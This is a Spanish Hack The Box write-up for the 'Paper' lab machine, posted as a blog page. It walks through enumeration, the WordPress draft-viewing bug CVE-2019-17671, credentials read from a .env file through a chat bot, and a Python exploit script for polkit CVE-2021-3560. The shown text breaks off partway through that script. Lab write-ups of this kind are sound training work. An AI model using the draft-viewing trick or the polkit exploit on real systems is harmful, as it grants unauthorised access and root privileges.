<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Paper" /><meta property="og:locale" content="en" /><meta name="description" content="Empezando con la enumeración encontramos servicios web en Wordpress con un hostanme oculto en la cabezera X-Backend-Server. Luego encontramos una vulnerabilidad en la versión actual de Wordpress que nos permite ver un Draft del sitio (CVE-2019-17671) y encontrar un nuevo dominio. En esta web encontramos un bot que nos permite listar directorios y archivos, con ello conseguimos una credenciales para entrar por SSH. Para la escalada usamos Linpeas y encontramos que la version de Sudo nos permite crear un usuario con privilegios (CVE-2021-3560), logearnos y ser root." /><meta property="og:description" content="Empezando con la enumeración encontramos servicios web en Wordpress con un hostanme oculto en la cabezera X-Backend-Server. Luego encontramos una vulnerabilidad en la versión actual de Wordpress que nos permite ver un Draft del sitio (CVE-2019-17671) y encontrar un nuevo dominio. En esta web encontramos un bot que nos permite listar directorios y archivos, con ello conseguimos una credenciales para entrar por SSH. Para la escalada usamos Linpeas y encontramos que la version de Sudo nos permite crear un usuario con privilegios (CVE-2021-3560), logearnos y ser root." /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBPaper/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBPaper/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-25T02:22:01-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Paper" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-25T02:22:01-05:00","datePublished":"2022-03-25T02:22:01-05:00","description":"Empezando con la enumeración encontramos servicios web en Wordpress con un hostanme oculto en la cabezera X-Backend-Server. Luego encontramos una vulnerabilidad en la versión actual de Wordpress que nos permite ver un Draft del sitio (CVE-2019-17671) y encontrar un nuevo dominio. En esta web encontramos un bot que nos permite listar directorios y archivos, con ello conseguimos una credenciales para entrar por SSH. Para la escalada usamos Linpeas y encontramos que la version de Sudo nos permite crear un usuario con privilegios (CVE-2021-3560), logearnos y ser root.","headline":"Hackthebox Writeup Paper","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBPaper/"},"url":"https://e1p0tr0.github.io/posts/HTBPaper/"}</script><title>Hackthebox Writeup Paper | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Paper</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Paper</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648192921" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-25 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1689 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>Empezando con la enumeración encontramos servicios web en <strong>Wordpress</strong> con un <strong>hostanme</strong> oculto en la cabezera <strong>X-Backend-Server</strong>. Luego encontramos una vulnerabilidad en la versión actual de Wordpress que nos permite ver un <strong>Draft</strong> del sitio <strong>(CVE-2019-17671)</strong> y encontrar un nuevo dominio. En esta web encontramos un bot que nos permite listar directorios y archivos, con ello conseguimos una credenciales para entrar por <strong>SSH</strong>. Para la escalada usamos <strong>Linpeas</strong> y encontramos que la version de <strong>Sudo</strong> nos permite crear un usuario con privilegios <strong>(CVE-2021-3560)</strong>, logearnos y ser root.</p><hr /><p><img data-src="/assets/img/htb/writeups/paper/logo.png" alt="Ppaer" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.143<td style="text-align: center">5 Feb 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar es importante verificar que estamos conectados a la <strong>VPN</strong> de <em>HackTheBox</em> y tenemos conexión con la máquina, para ello usamos el comando <code class="language-plaintext highlighter-rouge">ping</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/ping.png" alt="Ping" class="shadow" data-proofer-ignore></p><blockquote class="prompt-tip"><div><p>Observamos que enviamos un paquete <code class="language-plaintext highlighter-rouge">_1 packets transmitted_</code> y lo recibimos <code class="language-plaintext highlighter-rouge">_1 received_</code>, lo cuál significa que tenemos una conexión exitosa</p></div></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos enumerando los puertos <strong>TCP</strong> que están abiertos en la máquina víctima, para ello usamos la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/open_ports_tcp.png" alt="Nmap" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>--open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-v : Imprimir información del proceso del escaneo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-oG &lt;file&gt; : Guardar output en un archivo (&lt;file&gt;) de formato <em>grepable</em></p></blockquote><p>Observamos que tenemos abierto el puerto <strong>22 (ssh)</strong>, <strong>80 (http)</strong> y <strong>443 (https)</strong>, con esta información volvemos a realizar un escaneo pero a estos 3 puertos en específico:</p><p><img data-src="/assets/img/htb/writeups/paper/target_tcp.png" alt="Target" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p&lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Como no disponemos de credenciales válidas omitiremos toquetear el puerto <strong>22</strong>, pero lo que si tenemos son dos servicios web <strong>(http, https)</strong>, así que procedemos a ejecutar un <code class="language-plaintext highlighter-rouge">whatweb</code> a cada una de ellas y en paralelo las abrimos en el navegador para ver su contenido</p><p>Encontramos está página en los dos servicios, la cuál es una página de prueba tras instalar el servidor web:</p><p><img data-src="/assets/img/htb/writeups/paper/test_page.png" alt="Web" class="shadow" data-proofer-ignore></p><p>Por la otra parte encontramos algo interesante:</p><p><img data-src="/assets/img/htb/writeups/paper/whatweb.png" alt="WhatWeb" class="shadow" data-proofer-ignore></p><p>Como vemos arriba, en el output para el servicio <strong>http</strong> observamos un posible nombre de dominio <em>office.paper</em>, pero para estar mas seguros averiguamos de que va el campo <strong>X-Backend</strong> usando el parámetro <code class="language-plaintext highlighter-rouge">-v</code> de <code class="language-plaintext highlighter-rouge">whatweb</code> que nos pemite ver más información:</p><p><img data-src="/assets/img/htb/writeups/paper/x_backend_whatweb.png" alt="WhatWeb_XBackend" class="shadow" data-proofer-ignore></p><p>Al parecer se trata de un <em>plugin</em> que extrae información de ciertos <em>headers</em>, y como obervamos en los <strong>HTTP HEADERS</strong>, disponemos del header <a href="https://docs.gitlab.com/ee/user/application_security/dast/checks/16.4.html"><em>X-Backend_Server</em></a>, pero que significa excactamente?</p><p><img data-src="/assets/img/htb/writeups/paper/x_backend_header.png" alt="XBackend" class="shadow" data-proofer-ignore></p><p>Entonces encontramos un nombre de dominio <code class="language-plaintext highlighter-rouge">office.paper</code> de la máquina, pero al ejecutarle un <code class="language-plaintext highlighter-rouge">ping</code> o <code class="language-plaintext highlighter-rouge">curl</code> nos sale que es un servicio desconocido. Para estos casos llegamos a la conclusión que se está aplicando <strong>Virtual Hosting</strong>, y para tener una conexión debemos agregar <code class="language-plaintext highlighter-rouge">office.paper</code> a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.143 office.paper" &gt;&gt; /etc/hosts</code></p><p>Con estos pasos ya tendremos acceso al servicio web:</p><p><img data-src="/assets/img/htb/writeups/paper/web_page.png" alt="WebPage" data-proofer-ignore></p><p>Ya en la página, encontramos algo interesante sobre un post que menciona que un usuario publicó información confidencial en un borrador reciente, lo cuál puede ser una brecha vulnerable</p><p>Al igual que antes podemos extraer información del servicio web, lo haremos, pero está vez con la extensión del navegador <code class="language-plaintext highlighter-rouge">wappalyzer</code>. Podemos observar que se usa el gestor de contenido <code class="language-plaintext highlighter-rouge">WordPress 5.2.3</code>, y que por defecto poseen la ruta <code class="language-plaintext highlighter-rouge">wp-login.php</code> para poder logearse. En caso de que nos sepan eso, al momento de toquetear la página encontraran un enlace a esto mismo:</p><p><img data-src="/assets/img/htb/writeups/paper/wp-login_php.png" alt="WordPress" class="shadow" data-proofer-ignore></p><p>De primeras intentamos examinar la paǵina para ver el código fuente <code class="language-plaintext highlighter-rouge">ctrl + u</code> y observamos un posible <em>LFI</em> al momento de pinchar en el enlace <strong>Lost your password?</strong>. Además en al dirigirnos a la ruta <code class="language-plaintext highlighter-rouge">wp-admin</code> podemos observar en el <strong>URL</strong> una redirección y posible <em>RCE</em>, pero ninguna de estas 2 opciones funcionará para el acceso</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Buscando vulnerabilidades de la versión encontramos la adecuada para poder ver borradores privados sin estar autenticados <a href="https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2"><em>(CVE-2019-17671)</em></a>. La vulnerabilidad consiste en asignar al parametro <strong><em>static</em></strong> un valor a 1 <code class="language-plaintext highlighter-rouge">static=1</code>, lo cuál permitira desviar un condicional y nos permitira ver el siguiente draft:</p><p><img data-src="/assets/img/htb/writeups/paper/hidden_draft.png" alt="Draft" data-proofer-ignore></p><p>En el siguiente enlace encontramos la explicación de la vulnerabilidad a detalle: <a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/</a></p><p>Observamos una URL de un Sistema de chat para empleados, la cúal es un <strong>subdominio</strong> y se aplica <em>Virtual Hosting</em>, entonces la agregamos a nuetro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>: <code class="language-plaintext highlighter-rouge">echo "10.10.11.143 chat.office.paper" &gt;&gt; /etc/hosts</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/rocket_register.png" alt="RocketRegister" class="shadow" data-proofer-ignore></p><p>Procedemos a registrarnos y luego dentro del sistema de chat encontramos un <em>chat general</em> y mirando los mensajes antiguos encontramos que existe un <strong>bot</strong> llamado <em>recyclops</em> con el cuál puedes interactuar:</p><p><img data-src="/assets/img/htb/writeups/paper/recyclops_bot.png" alt="BotInfo" class="shadow" data-proofer-ignore></p><p>Procedemos a buscar al bot y escribimos <code class="language-plaintext highlighter-rouge">help</code> para que despliege un panel de ayuda y veamos de que manera podemos interactuar. Al parecer podemos listar <strong>directorios</strong> y <strong>archivos</strong>, así que empezamos a buscar y buscar, una cosa nos llevó a la otra y encontramos unas <strong>credenciales</strong>:</p><p><img data-src="/assets/img/htb/writeups/paper/credentials.png" alt="Credentials" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Para llegar al archivo :</p></div></blockquote><blockquote><ol><li><p>Primero fuimos a la raíz y listando encontramos un script <em>bot_restart.sh</em> que valida la ejecución del <strong>bot</strong> y lo resetea</p><li><p>Leyendo el código encontramos que ejecuta el script <em>start_bot.sh</em> y para verlo nos dirigimos a él</p><li><p>Leyendo el código vemos que ejecuta con <code class="language-plaintext highlighter-rouge">source</code> el contenido del archivo <em>.env</em> y luego el binario <em>hubot</em></p><li><p>Revisamos que ejecuta en el <em>.env</em> y sorpresa!</p></ol></blockquote><blockquote class="prompt-tip"><div><p>Este archivo <em>.env</em>, como menciona su nombre, sirve para asignar variables de entorno para la elaboración de un proyecto</p></div></blockquote><p>Recordamos que el puerto <strong>22 (ssh)</strong> está abierto y que en este chat nos encontrabamos como el usuario <code class="language-plaintext highlighter-rouge">dwight</code> (lo sabemos si miramos el archivo /etc/passwd con el bot), entonces usando la contraseña nos logeamos y pa-dentro:</p><p><img data-src="/assets/img/htb/writeups/paper/foothold.png" alt="Foothold" class="shadow" data-proofer-ignore></p><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Ya dentro como el usuario <code class="language-plaintext highlighter-rouge">dwight</code> solo nos queda escalar privilegios a <code class="language-plaintext highlighter-rouge">root</code> entonces hacemos una ejecución básica de comandos para listar binarios que podemos ejecutar como <strong>SUDO</strong> <code class="language-plaintext highlighter-rouge">sudo -l</code> o que tengan el permiso <strong>SUID</strong> <code class="language-plaintext highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/sudo_suid.png" alt="SUDO-SUID" class="shadow" data-proofer-ignore></p><p>Lamentablemente no logramos nada, así que recurrimos a la herramienta <a href="https://github.com/carlospolop/PEASS-ng">LinPEAS</a> que nos permite buscar diferentes rutas a explotar y poder <strong>escalar privilegios en el sistema</strong>. Una vez instalado lo pasamos a la máquina víctima con <code class="language-plaintext highlighter-rouge">nc</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/nc_transfer.png" alt="NcTransferLin" class="shadow" data-proofer-ignore></p><p>Ahora solo le damos permisos de ejecución <code class="language-plaintext highlighter-rouge">chmod +x linpeas.sh</code>, ejecutamos <code class="language-plaintext highlighter-rouge">./linpeas.sh</code> y de primeras encontramos una vulnerabilidad para <code class="language-plaintext highlighter-rouge">sudo 1.8.29</code>:</p><p><img data-src="/assets/img/htb/writeups/paper/cve_linpeas.png" alt="CVELinPEAS" class="shadow" data-proofer-ignore></p><p>Esta vulnerabilidad <a href="https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html"><em>CVE-2021-3560</em></a> se basa en el servicio <strong>polkit</strong>, el cuál se encarga de <em>gestionar la autorización entre los procesos sin privilegios hacia los privilegiados</em>.</p><p>Para la explotación hice un script en <code class="language-plaintext highlighter-rouge">python</code> que nos proporcionará las credenciales del usuario con privilegios:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">shlex</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">pdb</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">pwd</span>

<span class="c1"># colors
</span><span class="k">def</span> <span class="nf">inRed</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[91m {}</span><span class="se">\033</span><span class="s">[00m"</span> <span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">inGreen</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[92m {}</span><span class="se">\033</span><span class="s">[00m"</span> <span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">inYellow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[93m {}</span><span class="se">\033</span><span class="s">[00m"</span> <span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">inMagenta</span><span class="p">(</span><span class="n">s</span><span class="p">):</span> <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\033</span><span class="s">[95m {}</span><span class="se">\033</span><span class="s">[00m"</span> <span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>

<span class="c1"># ctrl + c
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
    <span class="n">inRed</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Exiting..."</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>

<span class="c1"># create user
</span><span class="k">def</span> <span class="nf">createUser</span><span class="p">(</span><span class="n">default_user</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">exit_user</span><span class="p">,</span> <span class="n">counter</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="mi">0</span>
    <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Trying to create default user...</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">exit_user</span><span class="p">:</span>
        <span class="c1"># start and kill the process until the user is created
</span>        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
        <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] Attempt"</span><span class="p">);</span> <span class="n">inRed</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">counter</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">'dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:</span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="s"> string:"creating user" int32:1'</span><span class="p">),</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">rand</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.006</span><span class="p">,</span> <span class="mf">0.009</span><span class="p">)</span>
            <span class="n">process</span><span class="p">.</span><span class="n">wait</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">rand</span><span class="p">)</span>
            <span class="n">process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
        <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
                <span class="n">process</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
        
        <span class="c1"># validate user creation
</span>        <span class="n">user</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">f</span><span class="s">'id </span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="s">'</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">).</span><span class="n">stdout</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"uid"</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n\t</span><span class="s">[*] User created:"</span><span class="p">);</span> <span class="n">inMagenta</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">default_user</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">inYellow</span><span class="p">(</span><span class="s">"</span><span class="se">\n\t</span><span class="s">[*] Time out at:"</span><span class="p">);</span> <span class="n">inGreen</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rand</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
            <span class="n">exist_user</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">counter</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">inRed</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] Error creating user!"</span><span class="p">);</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>

<span class="c1"># assing password
</span><span class="k">def</span> <span class="nf">assignPasswd</span><span class="p">(</span><span class="n">default_user</span><span class="p">,</span> <span class="n">default_password</span><span class="p">):</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
